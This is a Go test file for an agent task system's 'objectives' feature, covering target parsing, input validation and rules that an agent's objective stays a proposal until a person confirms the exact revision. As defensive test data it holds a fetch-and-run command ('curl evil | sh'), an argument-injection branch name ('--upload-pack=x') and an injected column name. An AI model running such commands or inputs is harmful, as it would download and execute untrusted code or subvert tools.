package core

import (
	"errors"
	"fmt"
	"math"
	"strings"
	"testing"
	"time"
)

func TestParseObjectiveTarget(t *testing.T) {
	for _, c := range []struct {
		until, measure, better string
		want                   string // measure until op better unit, "" for an error
		target, factor         float64
	}{
		{"", "", "", " |||", 0, 0},
		{"pass", "", "", "pass|pass", 0, 0},
		{"", "pass", "", "pass|pass", 0, 0},
		{"< 1s", "", "", "time|< 1s|<|lower", 1, 0},
		{"<=250ms", "", "", "time|<= 250ms|<=|lower", 0.25, 0},
		{"< 2 min", "", "", "time|< 2min|<|lower", 120, 0},
		{">= 80%", "", "", "value|>= 80%|>=|higher|%", 80, 0},
		{"< 10 warnings", "", "", "value|< 10 warnings|<|lower|warnings", 10, 0},
		{"< 5 s", "value", "", "value|< 5 s|<|lower|s", 5, 0},
		{"2x", "", "", "time|2x||lower", 0, 2},
		{"1.5X", "value", "higher", "value|1.5x||higher", 0, 1.5},
		{"-10%", "", "", "time|-10%||lower", 0, 1 / 0.9},
		{"-50%", "value", "", "value|-50%||lower", 0, 2},
		{"+5%", "", "", "value|+5%||higher", 0, 1.05},
		{"1x", "", "", "", 0, 0},
		{"-100%", "", "", "", 0, 0},
		{"+5%", "time", "", "", 0, 0},
		{"< 1", "time", "", "", 0, 0},
		{"< 1s", "", "higher", "", 0, 0},
		{"2x", "pass", "", "", 0, 0},
		{"faster", "", "", "", 0, 0},
		{"2x", "time", "higher", "", 0, 0},
		{"pass", "time", "", "", 0, 0},
		// What the parser takes beside those.
		{"PASSES", "", "", "pass|pass", 0, 0},
		{" Pass ", "pass", "", "pass|pass", 0, 0},
		{"<  1.5ms", "", "", "time|< 1.5ms|<|lower", 0.0015, 0},
		{"< 90m", "", "", "time|< 90m|<|lower", 5400, 0},
		{">= 100", "", "", "value|>= 100|>=|higher", 100, 0},
		{"> 3 open findings", "", "", "value|> 3 open findings|>|higher|open findings", 3, 0},
		{"<= 2 ops/s", "", "", "value|<= 2 ops/s|<=|lower|ops/s", 2, 0},
		{"> 0s", "", "", "time|> 0s|>|higher", 0, 0},
		{"< 1s", "VALUE", "", "value|< 1 s|<|lower|s", 1, 0},
		{"+5%", "value", "higher", "value|+5%||higher", 0, 1.05},
		{"-10%", "", "lower", "time|-10%||lower", 0, 1 / 0.9},
		{"3 x", "value", "", "value|3x||lower", 0, 3},
		{"< 0s", "", "", "", 0, 0},
		{"<= 0 ms", "", "", "", 0, 0},
		{"< 1h30m", "", "", "", 0, 0},
		{"< 1s", "bogus", "", "", 0, 0},
		{"< 1s", "", "sideways", "", 0, 0},
		{">= 80%", "", "lower", "", 0, 0},
		{"< 5", "", "higher", "", 0, 0},
		{"+5%", "", "lower", "", 0, 0},
		{"-10%", "", "higher", "", 0, 0},
		{"0%", "", "", "", 0, 0},
		{"-0%", "", "", "", 0, 0},
		{"0.5x", "", "", "", 0, 0},
		{"2x", "value", "lower", "value|2x||lower", 0, 2},
		{"< NaN", "", "", "", 0, 0},
		{"< 1e999", "value", "", "", 0, 0},
	} {
		tg, err := parseObjectiveTarget(c.until, c.measure, c.better)
		if c.want == "" {
			if !IsInvalid(err) {
				t.Errorf("%q %q %q: want invalid, got %+v, %v", c.until, c.measure, c.better, tg, err)
			}
			continue
		}
		if err != nil {
			t.Errorf("%q %q %q: %v", c.until, c.measure, c.better, err)
			continue
		}
		got := strings.TrimRight(strings.Join([]string{tg.measure, tg.until, tg.op, tg.better, tg.unit}, "|"), "|")
		if c.want == " |||" {
			if got != "" {
				t.Errorf("%q: got %q, want a loop", c.until, got)
			}
			continue
		}
		if got != c.want {
			t.Errorf("%q %q %q: got %q, want %q", c.until, c.measure, c.better, got, c.want)
		}
		if c.target != 0 && (tg.target == nil || math.Abs(*tg.target-c.target) > 1e-9) || c.target == 0 && c.factor != 0 && tg.target != nil {
			t.Errorf("%q: target %v, want %v", c.until, tg.target, c.target)
		}
		if (c.factor != 0) != (tg.factor != nil) || (tg.factor != nil && math.Abs(*tg.factor-c.factor) > 1e-9) {
			t.Errorf("%q: factor %v, want %v", c.until, tg.factor, c.factor)
		}
	}
}

// An agent's objective is a proposal: shown, never run, and not looping.
// A person puts it in effect by confirming the exact proposal they read;
// their own change of it starts from nothing unless they name that rev.
func TestObjectiveFromAnAgentIsAProposal(t *testing.T) {
	o := newObjEnv(t)
	task := o.task("Faster build")
	ob, err := o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{Check: ptrOf("make build"), Until: ptrOf("-10%")})
	if err != nil || ob.State != ObjectiveProposed || ob.SetAgent == "" || ob.ConfirmedBy != nil {
		t.Fatalf("an agent's objective: %+v, %v", ob, err)
	}
	if !strings.HasPrefix(ob.Text, "Proposed objective") || ob.Health != "proposed" || ob.Repo != "me/app" {
		t.Errorf("text %q health %q repo %q", ob.Text, ob.Health, ob.Repo)
	}
	o.noJob() // nothing is read, nothing runs
	if next, _ := o.queued(task.Key); !next {
		t.Error("a proposal holds the task back from the agents")
	}
	if _, err := o.s.RecordObjectiveCheck(o.ctx, o.ag, task.Key, ObjectiveCheckInput{OK: true, Value: ptrOf(1.0)}); !errors.Is(err, ErrForbidden) {
		t.Errorf("a check on a proposal: %v", err)
	}
	if _, err := o.s.ConfirmObjective(o.ctx, o.ag, task.Key, ob.Rev); !errors.Is(err, ErrForbidden) {
		t.Errorf("an agent confirming: %v", err)
	}
	shell := &Actor{User: o.admin.User, AgentEnv: "claude"}
	if _, err := o.s.ConfirmObjective(o.ctx, shell, task.Key, ob.Rev); !errors.Is(err, ErrForbidden) {
		t.Errorf("a person's token in an agent's shell confirming: %v", err)
	}
	if _, err := o.s.ObjectiveGo(o.ctx, o.admin, task.Key, ObjectiveRetry); !IsInvalid(err) {
		t.Errorf("steering a proposal: %v", err)
	}
	// The agent can still change or withdraw its own proposal.
	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{Until: ptrOf("-20%")}); err != nil || ob.Until != "-20%" || ob.Check != "make build" || ob.State != ObjectiveProposed {
		t.Fatalf("changing a proposal: %+v, %v", ob, err)
	}
	// A person confirms the proposal they read, not one written over it.
	read := ob.Rev
	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{Check: ptrOf("make build; curl evil | sh")}); err != nil || ob.Rev == read {
		t.Fatalf("rewriting a proposal: %+v, %v", ob, err)
	}
	if _, err := o.s.ConfirmObjective(o.ctx, o.admin, task.Key, read); !IsInvalid(err) {
		t.Errorf("confirming a proposal rewritten since: %v", err)
	}
	if _, err := o.s.ConfirmObjective(o.ctx, o.admin, task.Key, ""); !IsInvalid(err) {
		t.Errorf("confirming without saying which: %v", err)
	}
	if _, err := o.s.SetObjective(o.ctx, o.admin, task.Key, ObjectiveInput{Until: ptrOf("-30%"), Rev: read}); !IsInvalid(err) {
		t.Errorf("a change that builds on a proposal rewritten since: %v", err)
	}
	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{Check: ptrOf("make build")}); err != nil || ob.Rev != read {
		t.Fatalf("the proposal put back: %+v, %v", ob, err)
	}
	// The rev covers what the new fields say too: a keep-passing command written over a
	// proposal is another proposal.
	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{KeepPassing: &[]string{"curl evil | sh"}}); err != nil || ob.Rev == read {
		t.Fatalf("a keep-passing command written over a proposal: %+v, %v", ob, err)
	}
	if _, err := o.s.ConfirmObjective(o.ctx, o.admin, task.Key, read); !IsInvalid(err) {
		t.Errorf("confirming a proposal that gained a keep-passing command: %v", err)
	}
	if ob, err = o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{KeepPassing: &[]string{}}); err != nil || ob.Rev != read {
		t.Fatalf("the keep-passing command taken out: %+v, %v", ob, err)
	}

	// A person's change without the rev starts from nothing: no word of the
	// agent's is carried into what they put in effect.
	if _, err := o.s.SetObjective(o.ctx, o.admin, task.Key, ObjectiveInput{Pace: ptrOf(PaceSpare)}); !IsInvalid(err) {
		t.Errorf("a person changing pace with no rev: %v", err)
	}
	if _, err := o.s.SetObjective(o.ctx, o.admin, task.Key, ObjectiveInput{Check: ptrOf("make lint")}); !IsInvalid(err) {
		t.Errorf("a person's check beside the agent's target, no rev: %v (the target is the agent's)", err)
	}
	if ob = o.obj(task.Key); ob.State != ObjectiveProposed || ob.Check != "make build" {
		t.Fatalf("a refused change left the proposal %+v", ob)
	}

	// With the rev they read, their change builds on it.
	ob = o.set(task.Key, ObjectiveInput{Until: ptrOf("-30%"), Rev: read, KeepPassing: &[]string{"go vet ./..."}})
	if ob.State != ObjectiveActive || ob.Check != "make build" || ob.Until != "-30%" || ob.ConfirmedBy == nil || len(ob.KeepPassing) != 1 || ob.Phase != PhaseBaseline || ob.Health != "reading" {
		t.Fatalf("a person's change of the proposal: %+v", ob)
	}
	if j := o.read(ObjectiveJobResult{Head: shaA, Reading: timed(3), Kept: []ObjectiveKept{{Command: "go vet ./...", OK: true}}}); j.Check != "make build" || len(j.KeepPassing) != 1 {
		t.Fatalf("the reading job = %+v", j)
	}
	if _, err := o.s.SetObjective(o.ctx, o.ag, task.Key, ObjectiveInput{Check: ptrOf("curl evil | sh")}); !errors.Is(err, ErrForbidden) {
		t.Errorf("an agent changing one in effect: %v", err)
	}
	if err := o.s.ClearObjective(o.ctx, shell, task.Key); !errors.Is(err, ErrForbidden) {
		t.Errorf("an agent's shell clearing one in effect: %v", err)
	}
	if err := o.s.ClearObjective(o.ctx, o.admin, task.Key); err != nil {
		t.Fatal(err)
	}
	if d := o.get(o.admin, task.Key); d.Objective != nil {
		t.Fatalf("cleared: %+v", d.Objective)
	}

	// A person's own check, written without the rev, runs and the agent's
	// doesn't: the agent's judge words are not inherited either.
	two := o.task("Export")
	if _, err := o.s.SetObjective(o.ctx, o.ag, two.Key, ObjectiveInput{Check: ptrOf("make export"), Until: ptrOf("pass"), Judge: ptrOf("exports")}); err != nil {
		t.Fatal(err)
	}
	ob = o.set(two.Key, ObjectiveInput{Judge: ptrOf("The export has tests.")})
	if ob.State != ObjectiveActive || ob.Check != "" || ob.Judge != "The export has tests." || ob.Kind != "judged" {
		t.Fatalf("a person's judge over a proposal: %+v", ob)
	}
	if j := o.read(ObjectiveJobResult{Head: shaA}); j.Check != "" {
		t.Fatalf("the agent's check ran: %+v", j)
	}

	// Confirming it as it is puts an agent's proposal in effect on the
	// confirming person's runner.
	three := o.task("Lint")
	p, err := o.s.SetObjective(o.ctx, o.ag, three.Key, ObjectiveInput{Check: ptrOf("make lint"), Until: ptrOf("pass")})
	if err != nil {
		t.Fatal(err)
	}
	if ob, err = o.s.ConfirmObjective(o.ctx, o.admin, three.Key, p.Rev); err != nil || ob.State != ObjectiveActive || ob.ConfirmedBy == nil || ob.Phase != PhaseBaseline {
		t.Fatalf("confirm: %+v, %v", ob, err)
	}
	if h := o.history(three.Key); len(h) == 0 || !strings.Contains(h[len(h)-1], "confirmed") {
		t.Errorf("history = %q", h)
	}

	// A proposal nobody confirmed leaves the task an ordinary one.
	other := o.task("Other")
	if _, err := o.s.SetObjective(o.ctx, o.ag, other.Key, ObjectiveInput{}); err != nil {
		t.Fatal(err)
	}
	if res := o.worked(other.Key); !res.Finished {
		t.Fatalf("done with a proposed loop: %+v", res)
	}
}

func apWait(a *apEnv, key string) string {
	a.t.Helper()
	q, err := a.s.AgentQueueFor(a.ctx, a.admin, "anthropic/claude-opus-5-5", "")
	if err != nil {
		a.t.Fatal(err)
	}
	for _, w := range q.Waiting {
		if w.Issue.Key == key {
			return w.Reason + ": " + w.Detail
		}
	}
	return ""
}

// Pace "spare": the task is handed out only while the week's-end plan wants
// more work, so its rounds run on quota that would go unused. (No
// repository is attached here, so the objective is a loop.)
func TestObjectiveSparePaceWaitsForUnusedQuota(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "Hill climb", Agent: "claude"})
	ob, err := a.s.SetObjective(a.ctx, a.admin, task.Key, ObjectiveInput{Pace: ptrOf(PaceSpare)})
	if err != nil || ob.Pace != PaceSpare || ob.Kind != "loop" {
		t.Fatalf("objective = %+v, %v", ob, err)
	}
	if got := a.nextKey(); got != "" {
		t.Fatalf("next = %q mid-week", got)
	}
	if why := apWait(a, task.Key); !strings.Contains(why, "quota that would go unused") {
		t.Errorf("queue says %q", why)
	}
	a.spendOn(AutopilotLimits{SpendAtOnce: ptrOf(2)})
	a.weekAt(52, 2, 10*time.Hour)
	if got := a.nextKey(); got != task.Key {
		t.Fatalf("next = %q in the week's last hours with quota to spare", got)
	}
}

// A repository is what a check, a keep-passing command or a judge is read in: without one a
// person is told to attach it, and nothing is stored.
func TestObjectiveNeedsARepositoryToBeRead(t *testing.T) {
	a := newAPEnv(t)
	task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: "T", Agent: "claude"})
	for name, in := range map[string]ObjectiveInput{
		"a check":  {Check: ptrOf("make"), Until: ptrOf("pass")},
		"a judge":  {Judge: ptrOf("it is done")},
		"a repo":   {Judge: ptrOf("it is done"), Repo: ptrOf("me/app")},
		"a branch": {Branch: ptrOf("main")},
	} {
		if _, err := a.s.SetObjective(a.ctx, a.admin, task.Key, in); !IsInvalid(err) {
			t.Errorf("%s with no repository attached: %v", name, err)
		}
	}
	if _, err := a.s.GetObjective(a.ctx, a.admin, task.Key); !errors.Is(err, ErrNotFound) {
		t.Errorf("no objective: %v", err)
	}
}

func TestObjectiveInputIsChecked(t *testing.T) {
	o := newObjEnv(t)
	task := o.task("T")
	long := strings.Repeat("x", maxObjectiveCmd+1)
	for name, in := range map[string]ObjectiveInput{
		"a target with no check":               {Until: ptrOf("< 1s")},
		"a check with no target":               {Check: ptrOf("make test")},
		"a dir out of the repo":                {Check: ptrOf("make"), Until: ptrOf("pass"), Dir: ptrOf("../x")},
		"a dir with an empty step":             {Check: ptrOf("make"), Until: ptrOf("pass"), Dir: ptrOf("a//b")},
		"an unknown pace":                      {Pace: ptrOf("fast")},
		"a bad every":                          {Every: ptrOf("soon")},
		"too many rounds":                      {MaxRounds: ptrOf(5000)},
		"negative rounds":                      {MaxRounds: ptrOf(-1)},
		"a bad measure":                        {Check: ptrOf("make"), Until: ptrOf("< 1s"), Measure: ptrOf("speed")},
		"a bad better":                         {Check: ptrOf("make"), Until: ptrOf("< 1s"), Better: ptrOf("sideways")},
		"better against the target":            {Check: ptrOf("make"), Until: ptrOf(">= 80%"), Better: ptrOf("lower")},
		"a check too long":                     {Check: &long, Until: ptrOf("pass")},
		"a check with a NUL":                   {Check: ptrOf("make\x00"), Until: ptrOf("pass")},
		"a keep-passing command too long":      {Check: ptrOf("make"), Until: ptrOf("pass"), KeepPassing: &[]string{long}},
		"a keep-passing command with a NUL":    {Check: ptrOf("make"), Until: ptrOf("pass"), KeepPassing: &[]string{"a\x00"}},
		"nine keep-passing commands":           {Check: ptrOf("make"), Until: ptrOf("pass"), KeepPassing: &[]string{"h1", "h2", "h3", "h4", "h5", "h6", "h7", "h8", "h9"}},
		"keep-passing commands with no check":  {KeepPassing: &[]string{"go test ./..."}},
		"setup with nothing to run":            {Setup: ptrOf("make deps")},
		"a dir with nothing to run":            {Dir: ptrOf("internal")},
		"a judge bar not a severity":           {Judge: ptrOf("done"), JudgeBar: ptrOf("severe")},
		"a bar with no judge":                  {Check: ptrOf("make"), Until: ptrOf("pass"), JudgeBar: ptrOf("high")},
		"models with no judge":                 {Check: ptrOf("make"), Until: ptrOf("pass"), JudgeModels: &[]string{"claude/opus"}},
		"a judge model nobody runs":            {Judge: ptrOf("done"), JudgeModels: &[]string{"nonsense"}},
		"a judge model with a bad name":        {Judge: ptrOf("done"), JudgeModels: &[]string{"claude/bad name!"}},
		"too many judge models":                {Judge: ptrOf("done"), JudgeModels: &[]string{"claude/a", "claude/b", "claude/c", "claude/d", "claude/e", "claude/f", "claude/g", "claude/h", "claude/i"}},
		"a judge too long":                     {Judge: ptrOf(strings.Repeat("x", maxObjectiveJudge+1))},
		"a judge beside an amount every round": {Check: ptrOf("make"), Until: ptrOf("2x"), Judge: ptrOf("done")},
		"a repo of another project":            {Judge: ptrOf("done"), Repo: ptrOf("other/repo")},
		"a branch that isn't one":              {Judge: ptrOf("done"), Branch: ptrOf("a b")},
		"a branch starting with -":             {Judge: ptrOf("done"), Branch: ptrOf("--upload-pack=x")},
		"a repo on a loop":                     {Repo: ptrOf("me/app")},
		"a branch on a loop":                   {Branch: ptrOf("main")},
	} {
		if _, err := o.s.SetObjective(o.ctx, o.admin, task.Key, in); !IsInvalid(err) {
			t.Errorf("%s: %v", name, err)
		}
	}
	if _, err := o.s.GetObjective(o.ctx, o.admin, task.Key); !errors.Is(err, ErrNotFound) {
		t.Errorf("a refused input left an objective: %v", err)
	}
	ob := o.set(task.Key, ObjectiveInput{Check: ptrOf("go test ./..."), Until: ptrOf("< 90s"), Dir: ptrOf("./internal/"), Setup: ptrOf("go build ./..."), Every: ptrOf("3d"),
		KeepPassing: &[]string{" go vet ./... ", "", "go vet ./...", "make lint"}, Branch: ptrOf("release/1.x"), Repo: ptrOf("ME/APP")})
	if ob.Dir != "internal" || ob.Every != 3*24*3600 || ob.Setup != "go build ./..." || len(ob.KeepPassing) != 2 || ob.KeepPassing[0] != "go vet ./..." || ob.Branch != "release/1.x" || ob.Repo != "me/app" {
		t.Fatalf("objective = %+v", ob)
	}
	// Changing one field keeps the rest.
	if ob = o.set(task.Key, ObjectiveInput{Pace: ptrOf("spare")}); ob.Until != "< 90s" || ob.Check != "go test ./..." || ob.Pace != PaceSpare || ob.Every != 3*24*3600 || len(ob.KeepPassing) != 2 || ob.Branch != "release/1.x" {
		t.Fatalf("after a change: %+v", ob)
	}
	// A judge on top of the check, with a bar and models (named by the
	// audit's own way of naming them, repeats dropped).
	ob = o.set(task.Key, ObjectiveInput{Judge: ptrOf("It reads well."), JudgeBar: ptrOf(" HIGH "), JudgeModels: &[]string{"claude/opus", " ", "claude/opus", "grok-4.7-high"}})
	if ob.Judge != "It reads well." || ob.JudgeBar != "high" || len(ob.JudgeModels) != 2 || ob.Kind != "until" || ob.Check != "go test ./..." {
		t.Fatalf("with a judge: %+v", ob)
	}
	// Keep-passing commands are replaced, and emptied.
	if ob = o.set(task.Key, ObjectiveInput{KeepPassing: &[]string{}}); len(ob.KeepPassing) != 0 || ob.Judge == "" {
		t.Fatalf("keep-passing commands emptied: %+v", ob)
	}
	// Taking the judge off takes its bar and models with it.
	if ob = o.set(task.Key, ObjectiveInput{Judge: ptrOf("")}); ob.Judge != "" || ob.JudgeBar != "" || len(ob.JudgeModels) != 0 {
		t.Fatalf("without a judge: %+v", ob)
	}
	list, err := o.s.ListObjectives(o.ctx, o.admin, o.p.Key, false)
	if err != nil || len(list) != 1 || list[0].Key != task.Key {
		t.Fatalf("list = %+v, %v", list, err)
	}
	// A judge alone: the bar defaults to medium, the repository to the
	// project's only one.
	j := o.task("Judged")
	if ob = o.set(j.Key, ObjectiveInput{Judge: ptrOf("done")}); ob.JudgeBar != "medium" || ob.Repo != "me/app" || ob.Kind != "judged" || ob.Measure != "" {
		t.Fatalf("a judge alone: %+v", ob)
	}
	// A closed task takes no objective.
	done := o.task("Closed")
	if _, err := o.s.UpdateIssue(o.ctx, o.admin, done.Key, IssuePatch{Status: ptrOf("Done")}); err != nil {
		t.Fatal(err)
	}
	if _, err := o.s.SetObjective(o.ctx, o.admin, done.Key, ObjectiveInput{}); !IsInvalid(err) {
		t.Errorf("an objective on a closed task: %v", err)
	}
}

// A check is judged against the objective as it stands when the round
// ends: a change that doesn't touch the target leaves it as it was, not read
// again from its text.
func TestObjectiveKeepsItsTargetWhenAChangeLeavesItAlone(t *testing.T) {
	o := newObjEnv(t)
	task := o.task("Fast parse")
	ob := o.set(task.Key, ObjectiveInput{Check: ptrOf("./parse"), Until: ptrOf("< 1.5ms")})
	if ob = o.set(task.Key, ObjectiveInput{Until: &ob.Until, Pace: ptrOf(PaceSpare)}); ob.Target == nil || math.Abs(*ob.Target-0.0015) > 1e-12 {
		t.Errorf("target after a change of pace: %v (%s)", ob.Target, ob.Until)
	}
	other := o.task("Smaller bundle")
	ob = o.set(other.Key, ObjectiveInput{Check: ptrOf("./size"), Until: ptrOf("-10%"), Measure: ptrOf(MeasureValue)})
	if ob = o.set(other.Key, ObjectiveInput{Until: &ob.Until, MaxRounds: ptrOf(5)}); ob.Measure != MeasureValue || ob.Better != "lower" {
		t.Errorf("after a change of rounds: measure %s, better %s", ob.Measure, ob.Better)
	}
	// A change of the judge, the keep-passing commands or the repository leaves the target.
	if ob = o.set(other.Key, ObjectiveInput{KeepPassing: &[]string{"make test"}}); ob.Measure != MeasureValue || ob.Better != "lower" || ob.Factor == nil {
		t.Errorf("after a keep-passing command: %+v", ob)
	}
	tidy := o.task("Tidy parse")
	o.set(tidy.Key, ObjectiveInput{Check: ptrOf("./parse"), Until: ptrOf("< 1.5ms")})
	if ob = o.set(tidy.Key, ObjectiveInput{Judge: ptrOf("reads well")}); ob.Target == nil || math.Abs(*ob.Target-0.0015) > 1e-12 || ob.Judge != "reads well" {
		t.Errorf("after a judge: target %v, %+v", ob.Target, ob)
	}
	// A fixed target turned into one that never ends gets the day between rounds.
	if ob = o.set(task.Key, ObjectiveInput{Until: ptrOf("2x")}); ob.Every != 86400 {
		t.Errorf("every = %v after turning endless", ob.Every)
	}
}

// Where the workflow has no To Do status the round that is worked is the
// last: there is nowhere for the next to wait, so the objective ends with it.
func TestObjectiveEndsWhenTheWorkflowHasNoToDo(t *testing.T) {
	o := newObjEnv(t)
	task := o.task("Keep tidying")
	o.set(task.Key, ObjectiveInput{})
	o.take1(task.Key)
	if _, err := o.s.db.W.ExecContext(o.ctx, `UPDATE statuses SET category = 'backlog' WHERE project_id = ? AND category = 'todo'`, o.p.ID); err != nil {
		t.Fatal(err)
	}
	o.setClock(o.clockNow().Add(time.Minute))
	if _, err := o.s.AgentDone(o.ctx, o.ag, task.Key, AgentDoneInput{}); err != nil {
		t.Fatal(err)
	}
	o.s.Wait()
	d := o.get(o.admin, task.Key)
	if !d.Closed() || d.Objective.State != ObjectiveEnded || d.Objective.Round != 1 || len(d.Objective.Rounds) != 1 || d.Objective.Health != "ended" {
		t.Fatalf("with no To Do: %s, %+v", d.Status.Name, d.Objective)
	}
}

// Objectives in projects the actor can't see don't crowd the ones they can
// out of the list; the list puts what needs a person first and leaves out
// what is over unless asked.
func TestListObjectivesSkipsWhatTheActorCantSee(t *testing.T) {
	a := newAPEnv(t)
	old := objectiveListMost
	objectiveListMost = 2
	t.Cleanup(func() { objectiveListMost = old })
	bob := a.user("bob", false)
	mine := a.project(bob, "Mine", "")
	own := a.issue(bob, IssueInput{Project: mine.Key, Title: "Mine"})
	if _, err := a.s.SetObjective(a.ctx, bob, own.Key, ObjectiveInput{}); err != nil {
		t.Fatal(err)
	}
	for n := range 5 {
		a.setClock(a.clockNow().Add(time.Minute))
		task := a.issue(a.admin, IssueInput{Project: a.p.Key, Title: fmt.Sprint("Hidden ", n)})
		if _, err := a.s.SetObjective(a.ctx, a.admin, task.Key, ObjectiveInput{}); err != nil {
			t.Fatal(err)
		}
	}
	list, err := a.s.ListObjectives(a.ctx, bob, "", false)
	if err != nil || len(list) != 1 || list[0].Key != own.Key {
		t.Fatalf("bob's list = %+v, %v", list, err)
	}
	if list, err = a.s.ListObjectives(a.ctx, a.admin, "", false); err != nil || len(list) != 2 {
		t.Fatalf("the admin's list has at most 2: %d, %v", len(list), err)
	}
}

func TestListObjectivesOrdersAndFilters(t *testing.T) {
	o := newObjEnv(t)
	active := o.task("Active")
	o.set(active.Key, ObjectiveInput{})
	o.setClock(o.clockNow().Add(time.Minute))
	proposed := o.task("Proposed")
	if _, err := o.s.SetObjective(o.ctx, o.ag, proposed.Key, ObjectiveInput{Judge: ptrOf("done")}); err != nil {
		t.Fatal(err)
	}
	o.setClock(o.clockNow().Add(time.Minute))
	ended := o.task("Ended")
	o.set(ended.Key, ObjectiveInput{})
	if _, err := o.s.ObjectiveGo(o.ctx, o.admin, ended.Key, ObjectiveEnd); err != nil {
		t.Fatal(err)
	}
	o.setClock(o.clockNow().Add(time.Minute))
	blocked := o.task("Blocked")
	o.set(blocked.Key, ObjectiveInput{Judge: ptrOf("done")})
	o.s.Wait()
	// Its repository goes: nothing can read it, a person is asked.
	if _, err := o.s.db.W.ExecContext(o.ctx, `DELETE FROM project_repos WHERE project_id = ?`, o.p.ID); err != nil {
		t.Skip("can't detach the repository here: ", err)
	}
	keys := func(list []*Objective) []string {
		var out []string
		for _, ob := range list {
			out = append(out, ob.Key)
		}
		return out
	}
	list, err := o.s.ListObjectives(o.ctx, o.admin, o.p.Key, false)
	if err != nil {
		t.Fatal(err)
	}
	if got := keys(list); len(got) != 3 || got[2] != active.Key {
		t.Errorf("in effect or proposed, those needing a person first: %q (active %s)", got, active.Key)
	}
	if list, err = o.s.ListObjectives(o.ctx, o.admin, o.p.Key, true); err != nil || len(list) != 4 {
		t.Errorf("with all: %d, %v", len(list), err)
	}
	if list, err = o.s.ListObjectives(o.ctx, o.admin, "NOPE", false); err == nil {
		t.Errorf("a project that doesn't exist: %d objectives", len(list))
	}
}

// objSet writes only the columns it knows: a name that isn't one never
// reaches the query.
func TestObjSetRefusesAColumnItDoesNotKnow(t *testing.T) {
	e := newObjEnv(t)
	for _, kv := range [][]any{{"state = 'met', pace", "x"}, {"nope", 1}, {7, 1}, {"state"}} {
		err := e.s.write(e.ctx, e.admin, func(tx *tx) error { return e.s.objSet(e.ctx, tx, 1, kv...) })
		if err == nil {
			t.Errorf("objSet(%v) was accepted", kv)
		}
	}
}
